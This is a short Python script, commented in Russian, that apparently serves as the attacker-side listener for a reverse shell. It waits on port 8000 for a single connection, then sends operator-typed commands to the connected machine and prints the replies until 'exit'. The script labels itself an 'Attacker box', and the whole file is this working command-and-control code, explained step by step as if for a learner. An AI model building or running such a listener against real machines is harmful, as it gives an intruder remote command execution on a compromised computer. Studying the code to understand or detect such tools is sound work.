from socket import * 
serverPort = 8000
serverSocket = socket(AF_INET, SOCK_STREAM)
#  чтобы сокеты могли взаимодествовать с друг другом, нужно сделать так, чтобы у них были одни и те же версии IP и одни и те же протоколы
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
#  для большей надежности мы позволяем системе повтрно использовать недавно использованный сокет.
serverSocket.bind(('', serverPort))
#  эта функция принимает два параметра: IP-адрес компа и порт, если адрсес пуст, то тогда выберет IP назначенный Ip по умолчанию
serverSocket.listen(1)
#  теперь, когда сокет подключен, можно прослушивать соединения, а так как всего устройство одно, то и параметр равен одному
print("Attacker box listening and awaiting instructions")
connectionSocket, addr = serverSocket.accept()
#  как только клиент кодключиться к сокету, мы примет соеденения и вернем обьект, который будет использоваться для отправки и получения команд.
print("Thanks for connecting to me "
          +str(addr))
message = connectionSocket.recv(1024)
print(message) 
command =""
while command != "exit":
    command = input("Please enter a command: ")
    connectionSocket.send(command.encode())
    message = connectionSocket.recv(1024).decode()
    print(message)
    
connectionSocket.shutdown(SHUT_RDWR)
#  завершив отправку конмад, мы настроим соединение на быстрое завершение и закроем его.
connectionSocket.close()